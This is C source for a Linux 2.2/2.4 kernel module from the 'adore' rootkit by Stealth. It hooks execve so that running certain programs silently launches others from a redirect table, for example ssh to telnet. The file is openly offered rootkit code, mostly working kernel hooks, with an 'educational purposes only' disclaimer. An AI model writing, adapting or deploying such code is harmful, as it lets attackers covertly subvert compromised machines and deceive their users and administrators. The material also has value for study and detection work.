/*** (C) 2000,2001 by Stealth -- http://spider.scorpions.net/~stealth
 ***	
 ***
 *** (C)'ed Under a BSDish license. Please look at LICENSE-file.
 *** SO YOU USE THIS AT YOUR OWN RISK!
 *** YOU ARE ONLY ALLOWED TO USE THIS IN LEGAL MANNERS. 
 *** !!! FOR EDUCATIONAL PURPOSES ONLY !!!
 ***
 ***	-> Use ava to get all the things workin'.
 ***
 *** Greets fly out to all my friends. You know who you are. :)
 *** Special thanks to Shivan for granting root access to his
 *** SMP box for adore-development. More thx to skyper for also
 *** granting root access.
 ***
 ***/
#define MODULE
#define __KERNEL__

#ifdef MODVERSIONS
#include <linux/modversions.h>
#endif

#include <linux/config.h>
#include <linux/stddef.h>
//#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/sched.h>
#include <linux/ptrace.h>
#include <linux/slab.h>
#include <linux/smp_lock.h>
#include <linux/version.h>
#include <linux/mm.h>
#include <asm/uaccess.h>
#include <linux/file.h>

/* Note that this is "const"-Data. Attempts to
 * modify it will cause oops'. I didn't see any
 * kernelcode that does so, so I just mangle pointers. */
struct {
	char *old, *new;
} the_redirects[] = {
	{"/usr/bin/id", "/bin/ls"},	/* original, replacement */
	{"/bin/ssh", "/bin/telnet"},
	{"/bin/exec-test", "/tmp/foobar"},
	{NULL, NULL}
};

static int adore_count(char ** argv, int max);

/* lotsa code taken from kernel-source and modified */
#if LINUX_VERSION_CODE < KERNEL_VERSION(2,3,0)

int adore_execve(char * filename, char ** argv, char ** envp, 
		 struct pt_regs *regs, char *new_exe)
{
	struct linux_binprm bprm;
	struct dentry * dentry;
	int retval;
	int i;

	bprm.p = PAGE_SIZE*MAX_ARG_PAGES-sizeof(void *);
	for (i=0 ; i<MAX_ARG_PAGES ; i++) /* clear page-table */
		bprm.page[i] = 0;

	dentry = open_namei(new_exe, 0, 0);
	retval = PTR_ERR(dentry);
	if (IS_ERR(dentry))
		return retval;

	bprm.dentry = dentry;
	bprm.filename = filename;
	bprm.sh_bang = 0;
	bprm.java = 0;
	bprm.loader = 0;
	bprm.exec = 0;
	if ((bprm.argc = adore_count(argv, bprm.p / sizeof(void *))) < 0) {
		dput(dentry);
		return bprm.argc;
	}

	if ((bprm.envc = adore_count(envp, bprm.p / sizeof(void *))) < 0) {
		dput(dentry);
		return bprm.envc;
	}

	retval = prepare_binprm(&bprm);
	
	if (retval >= 0) {
		bprm.p = copy_strings(1, &bprm.filename, bprm.page, bprm.p, 2);
		bprm.exec = bprm.p;
		bprm.p = copy_strings(bprm.envc,envp,bprm.page,bprm.p,0);
		bprm.p = copy_strings(bprm.argc,argv,bprm.page,bprm.p,0);
		if ((long)bprm.p < 0)
			retval = (long)bprm.p;
	}

	if (retval >= 0)
		retval = search_binary_handler(&bprm,regs);

	if (retval >= 0)
		/* execve success */
		return retval;

	/* Something went wrong, return the inode and free the argument pages*/
	if (bprm.dentry)
		dput(bprm.dentry);

	for (i=0 ; i<MAX_ARG_PAGES ; i++)
		free_page(bprm.page[i]);

	return retval;
}
#else	/* 2.4 code now ... */

#include <linux/highmem.h>

/* What a shit! 2.2 kernel exports copy_strings() but 2.4 doesn't!
 */
/*
 * 'copy_strings()' copies argument/envelope strings from user
 * memory to free pages in kernel mem. These are in a format ready
 * to be put directly into the top of new user memory.
 */
int copy_strings(int argc,char ** argv, struct linux_binprm *bprm) 
{
	while (argc-- > 0) {
		char *str;
		int len;
		unsigned long pos;

		if (get_user(str, argv+argc) || !str || !(len = strnlen_user(str, bprm->p))) 
			return -EFAULT;
		if (bprm->p < len) 
			return -E2BIG; 

		bprm->p -= len;
		/* XXX: add architecture specific overflow check here. */ 

		pos = bprm->p;
		while (len > 0) {
			char *kaddr;
			int i, new, err;
			struct page *page;
			int offset, bytes_to_copy;

			offset = pos % PAGE_SIZE;
			i = pos/PAGE_SIZE;
			page = bprm->page[i];
			new = 0;
			if (!page) {
				page = alloc_page(GFP_HIGHUSER);
				bprm->page[i] = page;
				if (!page)
					return -ENOMEM;
				new = 1;
			}
			kaddr = kmap(page);

			if (new && offset)
				memset(kaddr, 0, offset);
			bytes_to_copy = PAGE_SIZE - offset;
			if (bytes_to_copy > len) {
				bytes_to_copy = len;
				if (new)
					memset(kaddr+offset+len, 0, PAGE_SIZE-offset-len);
			}
			err = copy_from_user(kaddr + offset, str, bytes_to_copy);
			kunmap(page);

			if (err)
				return -EFAULT; 

			pos += bytes_to_copy;
			str += bytes_to_copy;
			len -= bytes_to_copy;
		}
	}
	return 0;
}


/*
 * sys_execve() executes a new program.
 */
int adore_execve(char * filename, char ** argv, char ** envp,
		 struct pt_regs * regs, char *new_exe)
{
	struct linux_binprm bprm;
	struct file *file;
	int retval;
	int i;

	file = open_exec(new_exe);

	retval = PTR_ERR(file);
	if (IS_ERR(file))
		return retval;

	bprm.p = PAGE_SIZE*MAX_ARG_PAGES-sizeof(void *);
	memset(bprm.page, 0, MAX_ARG_PAGES*sizeof(bprm.page[0])); 

	bprm.file = file;
	bprm.filename = filename;
	bprm.sh_bang = 0;
	bprm.loader = 0;
	bprm.exec = 0;
	if ((bprm.argc = adore_count(argv, bprm.p / sizeof(void *))) < 0) {
		allow_write_access(file);
		fput(file);
		return bprm.argc;
	}

	if ((bprm.envc = adore_count(envp, bprm.p / sizeof(void *))) < 0) {
		allow_write_access(file);
		fput(file);
		return bprm.envc;
	}

	retval = prepare_binprm(&bprm);
	if (retval < 0) 
		goto out; 

	retval = copy_strings_kernel(1, &bprm.filename, &bprm);
	if (retval < 0) 
		goto out; 

	bprm.exec = bprm.p;
	retval = copy_strings(bprm.envc, envp, &bprm);
	if (retval < 0) 
		goto out; 

	retval = copy_strings(bprm.argc, argv, &bprm);
	if (retval < 0) 
		goto out; 

	retval = search_binary_handler(&bprm,regs);
	if (retval >= 0)
		/* execve success */
		return retval;

out:
	/* Something went wrong, return the inode and free the argument pages*/
	allow_write_access(bprm.file);
	if (bprm.file)
		fput(bprm.file);

	for (i = 0 ; i < MAX_ARG_PAGES ; i++) {
		struct page * page = bprm.page[i];
		if (page)
			__free_page(page);
	}

	return retval;
}

#endif

/*
 * adore_count() counts the number of arguments/envelopes
 */
static int adore_count(char **argv, int max)
{
	int i = 0;

	if (argv != NULL) {
		for (;;) {
			char *p = NULL;
			int error;

			error = get_user(p, argv);
			if (error)
				return error;
			if (!p)
				break;
			argv++;
			if (++i > max) return -E2BIG;
		}
	}
	return i;
}


/* Almost all taken from real x86 sys_execve() */
int n_execve(struct pt_regs regs)
{
	int error, i;
        char *filename, *new_exe = NULL;

	lock_kernel();
        filename = getname((char *) regs.ebx);
        error = PTR_ERR(filename);
        if (IS_ERR(filename))
                goto out;

	for (i = 0; the_redirects[i].old; ++i) {
		if (strcmp(the_redirects[i].old, filename) == 0) {
			new_exe = the_redirects[i].new;
			break;
		}
	}
	if (new_exe == NULL)
		new_exe = filename;

	error = adore_execve(filename, (char **) regs.ecx, (char **) regs.edx, 
			     &regs, new_exe);
        if (error == 0)
#ifdef PT_DTRACE	/* 2.2 vs. 2.4 */
                current->ptrace &= ~PT_DTRACE;
#else
		current->flags &= ~PF_DTRACE;
#endif
        putname(filename);
out:
	unlock_kernel();
        return error;
}

